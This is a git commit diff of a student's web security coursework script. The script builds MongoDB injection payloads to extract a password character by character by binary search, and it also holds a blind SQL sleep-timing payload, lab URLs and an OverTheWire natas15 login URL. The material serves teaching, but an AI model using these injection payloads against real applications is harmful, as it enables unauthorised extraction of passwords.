c6e12a141b454ca8eec94c3f92a3f0072bc566b3
rogers1lt <rogers1lt@live.com>
2017-10-30 19:49:20 -0700

    build payload function made

--- CS510_WebSec_P1.py
+++ CS510_WebSec_P1.py
@@ -1,31 +1,51 @@
 #CS510 Web Security Andrew Rogers Program 1
 #Fall 2017
 
-#regular expressions
+'''
+natas15 address
+http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/
 
-#SQL - IF, LIKE, SLEEP
-# IF(password LIKE BINARY "p4ssw0rd",sleep(5),null)
-# if the password is (case sensitive) p4ssw0rd, sleep for 5 seconds, otherwise do nothing
+regular expressions
 
-#Regex to match all password-- this.password.match(/^.*/)
+Regex to match all password-- this.password.match(/^.*/)
 
-#Add MondoDB comment and inject
-#?search=admin' && this.password.match(/^.*/)//
+Add MondoDB comment and inject
+?search=admin' && this.password.match(/^.*/)//
 
-#Only match if first char of password is capital letter or digit
-# http://131.252.220.62/mongodb/example2/?search=admin%27%20%26%26%20this.password.match(%2F%5e%5bA-Z0-9%5d.*%2F)%2F%2F
+Only match if first char of password is capital letter or digit
+ http://131.252.220.62/mongodb/example2/?search=admin%27%20%26%26%20this.password.match(%2F%5e%5bA-Z0-9%5d.*%2F)%2F%2F
 
-#Only match if first char of password is lowercase letter 
-# http://131.252.220.62/mongodb/example2/?search=admin%27%20%26%26%20this.password.match(%2F%5e%5ba-z%5d.*%2F)%2F%2F
+Only match if first char of password is lowercase letter 
+ http://131.252.220.62/mongodb/example2/?search=admin%27%20%26%26%20this.password.match(%2F%5e%5ba-z%5d.*%2F)%2F%2F
 
-testpwd = "t3sT"
+parking lot
+cap_url = "http://localhost:8000/mongodb/example2/?" + test_load ###### NORMAL LOAD
+
+'''
+import requests
+import urllib
+import time
+from bs4 import BeautifulSoup as soup
+
+def buildPayload(rangeStr, known_chars):
+	tempPayload = "admin' && this.password.match(/^" + known_chars + "[" + rangeStr + "].*/)//"
+	newPayload = {"search" : tempPayload}
+	return urllib.parse.urlencode(newPayload)
 
 full_range = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
+halfLenRange = int(len(full_range) / 2)
+front_range = full_range[:halfLenRange]
+back_range = full_range[halfLenRange:]
+pwd = ""
+test_load = buildPayload(back_range, pwd)
+#print(test_load)
 
-#Binary Search
-# 1. Is the character a number or capital?
-#	If yes is it a number?
-#		if yes then split the number range to find
-#		if no then split the capital letter range to find
-#	If no then split the lowercase letter range to find
-#
+cap_url = "http://localhost:8000/mongodb/example2/?" + test_load
+session = requests.Session()
+cap_response = session.get(cap_url)
+resp_text = soup(cap_response.text, "html.parser")
+print(resp_text.get_text(" "))
+
+
+
+
